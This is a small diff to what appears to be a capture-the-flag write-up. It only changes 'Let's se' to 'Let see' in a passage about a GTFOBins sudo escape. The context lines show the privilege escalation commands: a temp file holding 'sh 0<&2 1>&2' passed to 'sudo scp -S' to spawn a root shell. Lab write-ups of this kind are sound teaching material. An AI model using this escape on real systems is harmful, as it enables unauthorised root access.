@@ -219,7 +219,7 @@ I checked immediatly on [GFTOBins](https://gtfobins.github.io/) and found this f
 >sudo scp -S $TF x y:
 >```
 
-Let's se if it works and
+Let see if it works and
 ```
 dennis@ip-10-10-251-164:~$ TF=$(mktemp)
 dennis@ip-10-10-251-164:~$ echo 'sh 0<&2 1>&2' > $TF
